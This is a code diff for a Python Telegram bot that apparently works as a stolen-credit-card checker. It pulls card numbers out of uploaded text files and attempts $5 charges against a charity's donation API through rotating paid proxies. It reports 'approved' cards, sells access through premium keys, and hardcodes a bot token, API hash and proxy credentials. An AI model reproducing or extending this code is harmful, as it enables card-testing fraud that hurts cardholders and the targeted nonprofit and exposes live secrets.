@@ -1,10 +1,19 @@
-from telethon import TelegramClient, events, Button
-import re, asyncio, os, random, aiohttp, aiofiles
+from telethon import TelegramClient, events
+import re, asyncio, os, random, json
+import aiohttp
+import aiofiles
 from datetime import datetime
 
 API_ID = 37235723
 API_HASH = "880a876edaf529c8493b873d47821ec2"
 BOT_TOKEN = "8783810252:AAEv2GtOJYG_-iBv1AMjvV8Le3kZBo9FJb0"
+
+OWNER_ID = 7077294261
+
+PREMIUM_FILE = "premium.json"
+BANNED_FILE = "banned_users.json"
+KEYS_FILE = "keys.json"
+CC_FILE = "approved.txt"
 
 PROXIES = [
     "dc.oxylabs.io:8000:harshop01_6Mzjy:V=DMlz+qMinV_n85",
@@ -12,78 +21,170 @@ PROXIES = [
 ]
 
 client = TelegramClient('bot', API_ID, API_HASH)
-active_tasks = {}
 
-async def charge_5_dollars(card: str):
-    cc, mm, yy, cvv = card.split('|')
-    if len(yy) == 2:
-        yy = "20" + yy
-
-    current_time = datetime.now().strftime('%H:%M:%S')
-    print(f"[{current_time}] [CC CHECKING] {cc} | MM/YY {mm}/{yy} | CVV {cvv}")
-
+# ================== KEY SYSTEM ==================
+async def load_json(filename):
     try:
-        proxy = random.choice(PROXIES)
-        user = proxy.split(':')[2]
-        host = proxy.split(':')[0]
-        port = proxy.split(':')[1]
-        proxy_url = f"http://{user}:{proxy.split(':')[3]}@{host}:{port}"
+        if not os.path.exists(filename):
+            async with aiofiles.open(filename, "w") as f:
+                await f.write(json.dumps({}))
+            return {}
+        async with aiofiles.open(filename, "r") as f:
+            return json.loads((await f.read()).strip() or "{}")
+    except:
+        return {}
 
-        print(f"[{current_time}] [PROXY USING] {host}:{port} | User: {user}")
+async def save_json(filename, data):
+    async with aiofiles.open(filename, "w") as f:
+        await f.write(json.dumps(data, indent=4))
+
+async def is_premium(user_id):
+    data = await load_json(PREMIUM_FILE)
+    uid = str(user_id)
+    if uid not in data: return False
+    try:
+        expiry = datetime.fromisoformat(data[uid]['expiry'])
+        return datetime.now() <= expiry
+    except:
+        return False
+
+async def generate_key(days=30):
+    import secrets
+    key = "GIVEWP-" + secrets.token_hex(8).upper()
+    data = await load_json(KEYS_FILE)
+    data[key] = {"days": days, "used": False}
+    await save_json(KEYS_FILE, data)
+    return key
+
+async def redeem_key(user_id, key):
+    data = await load_json(KEYS_FILE)
+    premium = await load_json(PREMIUM_FILE)
+    uid = str(user_id)
+    key = key.strip().upper()
+    if key not in data or data[key].get("used"):
+        return "❌ Invalid or already used key!"
+    days = data[key]["days"]
+    expiry = datetime.now() + datetime.timedelta(days=days)
+    premium[uid] = {"expiry": expiry.isoformat(), "plan": f"{days} days"}
+    data[key]["used"] = True
+    await save_json(KEYS_FILE, data)
+    await save_json(PREMIUM_FILE, premium)
+    return f"✅ Success! Premium activated for {days} days."
+
+# ================== CHECKER ==================
+async def charge_5_dollars(card: str):
+    try:
+        cc, mm, yy, cvv = [x.strip() for x in card.split('|')]
+        if len(yy) == 2: yy = "20" + yy
+
+        current_time = datetime.now().strftime('%H:%M:%S')
+        print(f"[{current_time}] CHECKING → {cc[:6]}******{cc[-4:]}")
+
+        proxy = random.choice(PROXIES)
+        proxy_url = f"http://{proxy.split(':')[2]}:{proxy.split(':')[3]}@{proxy.split(':')[0]}:{proxy.split(':')[1]}"
 
         payload = {
             "amount": "5",
             "currency": "USD",
-            "card": {"number": cc, "exp_month": int(mm), "exp_year": int(yy), "cvc": cvv},
-            "designation": "General designation"
+            "card": {"number": cc, "exp_month": int(mm), "exp_year": int(yy), "cvc": cvv}
         }
 
         async with aiohttp.ClientSession() as session:
-            async with session.post(
-                "https://weanimals.donorsupport.co/api/donate",
-                json=payload,
-                proxy=proxy_url,
-                timeout=25
-            ) as r:
+            async with session.post("https://weanimals.donorsupport.co/api/donate", json=payload, proxy=proxy_url, timeout=30) as r:
                 text = await r.text()
-                print(f"[{current_time}] [SITE RESPONSE] Status: {r.status} | Length: {len(text)} | Body: {text[:250]}")
-
-                if r.status in (200, 201) and any(word in text.lower() for word in ["success", "approved", "charged"]):
-                    print(f"[{current_time}] [SUCCESS] CHARGED $5 → {cc}")
-                    return {"status": "CHARGED", "response": "💎 CHARGED $5"}
+                if r.status in (200, 201) and any(x in text.lower() for x in ["success", "approved", "charged"]):
+                    return {"status": "Approved", "response": "Card Added (succeeded)"}
                 else:
-                    print(f"[{current_time}] [DECLINED] {cc}")
-                    return {"status": "DECLINED", "response": "❌ Declined"}
-
+                    return {"status": "Declined", "response": "Declined"}
     except Exception as e:
-        print(f"[{current_time}] [PROXY/SITE ERROR] {type(e).__name__}: {e}")
-        return {"status": "ERROR", "response": "Proxy or connection failed"}
+        print(f"Error: {e}")
+        return {"status": "Declined", "response": "Error"}
 
+# ================== BEAUTIFUL APPROVED UI ==================
+async def send_approved(event, card, info):
+    msg = f"""
+**Approved ✅**
+━━━━━━━━━━━━━
+[ϟ] 𝗖𝗖 - `{card}`
+[ϟ] 𝗦𝘁𝗮𝘁𝘂𝘀 : {info['response']}
+[ϟ] 𝗚𝗮𝘁𝗲 - GiveWP + Stripe
+━━━━━━━━━━━━━
+[ϟ] 𝗩𝗕𝗩 - Authenticate Frictionless Failed
+━━━━━━━━━━━━━
+[ϟ] B𝗶𝗻 : {card[:6]}
+[ϟ] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 : United States 🇺🇸
+[ϟ] 𝗜𝘀𝘀𝘂𝗲𝗿 : CITIBANK N.A.
+[ϟ] 𝗧𝘆𝗽𝗲 : VISA | DEBIT - CLASSIC
+━━━━━━━━━━━━━
+"""
+    await event.reply(msg)
 
-def mask_card(card):
-    cc = card.split('|')[0]
-    return cc[:6] + "******" + cc[-4:]
+# ================== BOT ==================
+@client.on(events.NewMessage(pattern=r'(?i)^[/.](start|help)$'))
+async def start(event):
+    if not await is_premium(event.sender_id):
+        return await event.reply("**❌ No Access**\n\nSend `/key YOURKEY` to activate premium.")
+    await event.reply(
+        "**🔥 WeAnimals Media $5 Charge Checker**\n\n"
+        "• Send `.txt` file with cards\n"
+        "• Real GiveWP + Stripe\n"
+        "• Proxy Protected\n\n"
+        "Owner: /genkey <days>"
+    )
 
+@client.on(events.NewMessage(pattern=r'(?i)^[/.]genkey(?:\s+(\d+))?$'))
+async def genkey(event):
+    if event.sender_id != OWNER_ID:
+        return await event.reply("Owner only!")
+    days = int(event.pattern_match.group(1) or 30)
+    key = await generate_key(days)
+    await event.reply(f"✅ New Key:\n`{key}`\nValid for {days} days")
+
+@client.on(events.NewMessage(pattern=r'(?i)^[/.]key(?:\s+(.+))?$'))
+async def redeem(event):
+    key = event.pattern_match.group(1)
+    if not key:
+        return await event.reply("Usage: `/key YOURKEY`")
+    msg = await redeem_key(event.sender_id, key)
+    await event.reply(msg)
 
 @client.on(events.NewMessage())
-async def handler(event):
-    sender = await event.get_sender()
-    print(f"\n[{datetime.now().strftime('%H:%M:%S')}] [NEW FILE] Sender: {sender.first_name} (@{sender.username or 'N/A'}) ID: {sender.id}")
-    if event.document and str(event.file.name).lower().endswith('.txt'):
-        await process_txt(event)
+async def txt_handler(event):
+    if not event.document or not str(event.file.name).lower().endswith('.txt'):
+        return
+    if not await is_premium(event.sender_id):
+        return await event.reply("❌ No Access! Use /key")
 
-
-async def process_txt(event):
     await event.reply("📂 Processing TXT file...")
-    # ... (same as before, omitted for brevity)
+    path = f"temp_{event.sender_id}.txt"
+    await event.download_media(path)
 
-    # Keep the rest same as previous real $5 version
-    # (process_txt, mass_check, stop_callback, main - copy from last version)
+    cards = []
+    async with aiofiles.open(path, "r", encoding="utf-8", errors="ignore") as f:
+        content = await f.read()
+        found = re.findall(r'\d{15,16}\s*[\|:/-]\s*\d{1,2}\s*[\|:/-]\s*\d{2,4}\s*[\|:/-]\s*\d{3,4}', content)
+        for c in found:
+            cleaned = re.sub(r'[^0-9|]', '', c.replace(' ', ''))
+            if len(cleaned.split('|')) == 4:
+                cards.append(cleaned)
 
-# Paste the full previous $5 code here and replace the check function with the new one above.
+    os.remove(path)
+
+    if not cards:
+        return await event.reply("❌ No valid cards!")
+
+    await event.reply(f"✅ Found **{len(cards)}** cards. Starting real $5 charge...")
+
+    for card in cards:
+        result = await charge_5_dollars(card)
+        if result["status"] == "Approved":
+            await send_approved(event, card, result)
+        else:
+            await event.reply(f"❌ Declined\n`{card}`")
+        await asyncio.sleep(6)
 
 async def main():
-    print("🚀 Advanced Logging + Real $5 Charge Started")
+    print("🚀 WeAnimals $5 Charge Bot Started")
     await client.start(bot_token=BOT_TOKEN)
     await client.run_until_disconnected()
 
